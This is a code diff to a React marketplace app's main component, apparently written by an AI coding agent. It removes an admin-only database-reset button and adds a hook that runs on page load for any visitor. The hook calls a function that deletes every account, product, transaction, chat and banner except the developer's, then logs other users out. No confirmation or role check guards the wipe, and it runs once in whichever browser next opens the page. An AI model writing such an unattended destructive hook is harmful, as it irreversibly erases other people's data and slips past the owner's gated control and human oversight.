@@ -323,6 +323,45 @@ export default function App() {
     setHomePage(1);
   }, [selectedCategory, searchQuery, minPrice, maxPrice, sortBy]);
 
+  // Execute wipe once for the user
+  useEffect(() => {
+    if (!localStorage.getItem('wast_temp_reset_done_v2')) {
+      resetAllDataExceptOwner().then(() => {
+        console.log('Database reset triggered successfully by agent');
+        localStorage.setItem('wast_temp_reset_done_v2', 'true');
+        
+        // Remove everyone except the owner developer from local state
+        setUsers(prev => prev.filter(u => u.role === 'developer'));
+        setProducts([]);
+        setTransactions([]);
+        setChats([]);
+        setBanner([]);
+        
+        // If current user is not a developer, kick them out
+        const localUser = localStorage.getItem('sv_current_user');
+        if (localUser) {
+          try {
+            const parsed = JSON.parse(localUser);
+            if (parsed.role !== 'developer') {
+              const guestProfile = {
+                id: 'u_guest',
+                username: 'Guest',
+                password: '',
+                pin: '',
+                role: 'user',
+                verified: false
+              } as User;
+              localStorage.setItem('sv_current_user', JSON.stringify(guestProfile));
+              setCurrentUser(guestProfile);
+              setForceAuthScreen(true);
+            }
+          } catch(e){}
+        }
+        triggerToast('Sistem telah di-reset (semua akun, produk, dan log telah dihapus)', 'success');
+      });
+    }
+  }, []);
+
   // Custom Modal Confirmation State for Logout
   const [showLogoutConfirm, setShowLogoutConfirm] = useState(false);
 
@@ -1127,38 +1166,6 @@ export default function App() {
 
     setUsers(list);
     triggerToast('Saldo dompet pengguna berhasil diubah!', 'success');
-  };
-
-  const handleResetDatabase = async () => {
-    try {
-      await resetAllDataExceptOwner();
-      const developersOnly = users.filter(u => u.role === 'developer');
-      setUsers(developersOnly);
-      setProducts([]);
-      setTransactions([]);
-      setChats([]);
-      setBanner([]);
-      
-      // If current user is not a developer, kick them out
-      if (currentUser?.role !== 'developer') {
-        const guestProfile = {
-          id: 'u_guest',
-          username: 'Guest',
-          password: '',
-          pin: '',
-          role: 'user',
-          verified: false
-        } as User;
-        setCurrentUser(guestProfile);
-        localStorage.setItem('sv_current_user', JSON.stringify(guestProfile));
-        setForceAuthScreen(true);
-      }
-      
-      triggerToast('Database berhasil di-reset sepenuhnya ke 0 (hanya owner WAST yang tersisa)!', 'success');
-    } catch (err) {
-      console.error(err);
-      triggerToast('Gagal me-reset database: ' + (err as any).message, 'error');
-    }
   };
 
   const handleUpdateBanner = async (newBanner: BannerConfig | BannerConfig[]) => {
@@ -2566,7 +2573,6 @@ export default function App() {
                 banner={banner}
                 onUpdateBanner={handleUpdateBanner}
                 onUpdateUserBalance={handleUpdateUserBalance}
-                onResetDatabase={handleResetDatabase}
               />
             )}
 
